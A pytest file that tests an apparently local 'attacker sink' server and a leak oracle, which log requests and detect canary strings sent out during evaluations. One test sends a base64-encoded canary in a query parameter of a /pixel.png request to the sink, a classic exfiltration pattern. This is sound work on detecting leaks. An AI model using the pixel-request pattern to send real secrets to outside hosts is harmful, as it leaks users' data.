"""The attacker sink logs every request and exposes the log."""

from __future__ import annotations

import base64
import json

import httpx
from oracle.leak import new_canary, scan
from oracle.sink import SinkServer


def test_logs_method_path_query_headers_body(attacker_sink) -> None:
    c = httpx.Client(base_url=attacker_sink.url)
    c.get("/a/b", params={"d": "secret value", "x": "1"}, headers={"X-Test": "yes"})
    c.post("/collect?k=v", content=b'{"hello":"world"}', headers={"Content-Type": "application/json"})
    c.put("/p", content="text body")
    c.delete("/gone")
    entries = attacker_sink.entries()
    assert [e["method"] for e in entries] == ["GET", "POST", "PUT", "DELETE"]
    assert [e["seq"] for e in entries] == [1, 2, 3, 4]
    get, post = entries[0], entries[1]
    assert get["path"] == "/a/b" and get["query"] == {"d": ["secret value"], "x": ["1"]}
    assert get["headers"]["X-Test"] == "yes"
    assert post["path"] == "/collect" and post["query"] == {"k": ["v"]}
    assert json.loads(post["body"]) == {"hello": "world"}
    assert entries[2]["body"] == "text body"


def test_log_endpoint_returns_entries_and_supports_since_and_reset(attacker_sink) -> None:
    c = httpx.Client(base_url=attacker_sink.url)
    assert c.get("/_log").json() == {"count": 0, "entries": []}
    c.get("/one")
    c.get("/two")
    log = c.get("/_log").json()
    assert log["count"] == 2 and [e["path"] for e in log["entries"]] == ["/one", "/two"]
    assert [e["path"] for e in c.get("/_log", params={"since": 1}).json()["entries"]] == ["/two"]
    assert c.get("/healthz").json() == {"status": "ok"}
    assert len(c.get("/_log").json()["entries"]) == 2  # control endpoints are not logged
    assert c.delete("/_log").json() == {"cleared": True}
    assert c.get("/_log").json()["count"] == 0


def test_binary_body_is_kept_as_base64(attacker_sink) -> None:
    httpx.post(f"{attacker_sink.url}/bin", content=b"\xff\xfe\x00\x01")
    e = attacker_sink.entries()[0]
    assert e["body"] == "" and base64.b64decode(e["body_b64"]) == b"\xff\xfe\x00\x01"


def test_jsonl_log_file(tmp_path) -> None:
    log = tmp_path / "sink.jsonl"
    with SinkServer(log_path=log) as sink:
        httpx.get(f"{sink.url}/x?q=1")
        httpx.post(f"{sink.url}/y", content="b")
    lines = [json.loads(line) for line in log.read_text(encoding="utf-8").splitlines()]
    assert [(e["method"], e["path"]) for e in lines] == [("GET", "/x"), ("POST", "/y")]


def test_sink_log_feeds_the_leak_oracle(attacker_sink) -> None:
    canary = new_canary()
    httpx.get(f"{attacker_sink.url}/pixel.png", params={"d": base64.b64encode(canary.encode()).decode()})
    assert scan(attacker_sink.entries(), {"c": canary})  # exfiltration is provable from the sink log
    attacker_sink.clear()
    assert scan(attacker_sink.entries(), {"c": canary}) == []


def test_ports_are_free_and_distinct() -> None:
    with SinkServer() as a, SinkServer() as b:
        assert a.port != b.port and a.port > 0
